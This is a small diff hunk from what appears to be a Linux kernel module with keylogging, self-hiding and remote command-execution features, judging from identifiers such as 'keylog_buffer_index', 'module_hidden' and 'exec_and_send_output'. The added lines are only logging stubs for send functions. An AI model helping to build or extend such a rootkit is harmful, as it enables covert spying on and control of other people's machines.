@@ -98,6 +98,15 @@ int keylog_buffer_index = 0;
 struct list_head module_list;
 bool module_hidden = false;
 
+// Stubs pour send_data et send_error
+void send_data(const char *msg) {
+    printk(KERN_INFO "send_data: %s\n", msg);
+}
+
+void send_error(int code, const char *msg) {
+    printk(KERN_ERR "send_error [%d]: %s\n", code, msg);
+}
+
 static void exec_and_send_output(const char *command) {
     struct file *output_file;
     char *output_buffer;
